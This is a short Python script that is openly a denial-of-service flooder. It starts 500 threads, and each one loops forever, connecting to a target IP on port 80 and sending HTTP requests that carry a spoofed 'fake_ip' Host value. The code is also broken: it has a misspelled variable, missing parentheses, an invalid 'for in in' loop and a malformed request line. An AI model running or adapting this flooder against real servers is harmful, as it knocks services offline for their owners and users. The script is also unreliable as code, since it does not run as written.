import socket
import threading

target='10.21.163.119'
fake_ip='182.21.20.12'
port=80

def attack():
    while True:
	   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	   s.connect((taregt,port))
	   s.sendto(("GET//" + target + "HTTP/1.1\r\n").encode('ascii'),(target,port)
	   s.sendto(("Host:" + fake_ip + "\r\n\r\n").encode('ascii'),(target,port)
	   s.close()
	 
for in in range(500):
    thread=threading.Thread(target=attack)
    thread.start()	
	   